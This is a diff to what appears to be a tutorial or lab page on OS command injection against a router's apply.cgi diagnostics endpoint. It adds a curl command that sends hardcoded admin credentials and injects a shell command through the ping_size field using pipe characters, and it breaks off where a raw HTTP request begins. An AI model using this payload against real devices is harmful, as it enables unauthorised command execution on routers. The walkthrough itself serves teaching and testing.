@@ -2,11 +2,16 @@
 title = "OS Command Injection"
 date = 2021-10-18T20:39:54-06:00
 weight = 5
+draft = true
 +++
 
 
 ## OS Command Injection
-
+Run the following command:
+```sh
+cmd="uname -a"
+curl -x http://localhost:8080 -k --user 'admin:LvawK!*C@6MR!Cz#*V2$ze@#7v75iT' -X POST -d "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_times=5&traceroute_ip=" --data-urlencode "ping_size=|$cmd|" http://172.21.0.15:8080/apply.cgi >/dev/null
+```
 Make an HTTP POST request to the router like the following:
 ```
 POST /apply.cgi HTTP/1.1
